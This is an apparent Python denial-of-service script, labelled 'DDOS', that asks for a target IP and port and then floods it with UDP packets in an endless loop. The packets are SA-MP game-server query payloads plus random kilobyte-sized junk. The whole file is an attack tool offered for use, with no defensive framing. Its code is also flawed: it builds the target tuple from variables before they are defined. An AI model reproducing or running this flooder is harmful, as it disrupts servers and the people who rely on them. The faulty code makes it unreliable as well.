#//===//===//===//===//===//===//===//===//===//===//===//===//===//===//
#//===//===//===//===//                            \\===\\===\\===\\===\\
#//===//===//===//===//                            \\===\\===\\===\\===\\
#//===//===//===//===//                            \\===\\===\\===\\===\\
#//===//===//===//===//===//===//===//===//===//===//===//===//===//===//

#//===//===//===//===//===//===//===//===//===//===//===//===//===//===//
#//===//===//=== DDOS IMPORTS
import random
import socket
import os
import sys
import struct
import codecs

#//===//===//===//===//===//===//===//===//===//===//===//===//===//===//
#//===//===//=== DDOS CODECS
Data = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]

#//===//===//===//===//===//===//===//===//===//===//===//===//===//===//
#//===//===//=== DDOS DEFINES
sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
r = random.choice(("[€]","[¥]","[✓]"))
ping = (str(ip),int(port))
msg = Data[random.randrange(0, 3)]

#//===//===//===//===//===//===//===//===//===//===//===//===//===//===//
#//===//===//=== DDOS URANDOM
bytes = random._urandom(1032)
byte = random._urandom(1123)
byt = random._urandom(1124)
by = random._urandom(1024)
b = random._urandom(1125)
a = random._urandom(1180)
c = random._urandom(1024)
d = random._urandom(1800)

#//===//===//===//===//===//===//===//===//===//===//===//===//===//===//
#//===//===//=== DDOS STARTED
clear = lambda: os.system("cls")
clear()
ip = str(input("   \u001b[37m@DDOS ════> Ip/Host :\u001b[31m  "))
port = int(input("   \u001b[37m@DDOS ════> Port Server :\u001b[31m  "))
times = int(input("   \u001b[37m@DDOS ════> Connections :\u001b[31m  "))

while 1:
    try:
        for x in range(times):
            sock.sendto(msg, (ip, int(port)))
            sock.sendto(Data[5], (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Data[5], (ip, int(port)))
            elif int(port) == 7792:
                sock.sendto(Data[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Data[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Data[7], (ip, int(port)))
            sock.sendto(bytes,ping)
            sock.sendto(byte,ping)
            sock.sendto(byt,ping)
            sock.sendto(by,ping)
            sock.sendto(b,ping)
            sock.sendto(a,ping)
            sock.sendto(c,ping)
            sock.sendto(d,ping)
        print(r,f"\u001b[33m @ATTACK ════> \u001b[31mTo Ip \u001b[37m{ip} \u001b[31mOn Port \u001b[37m{port}")
    except:
        print(r,f"\u001b[33m @ATTACK ════> \u001b[31mTo Ip \u001b[37m{ip} \u001b[31mOn Port \u001b[37m{port}")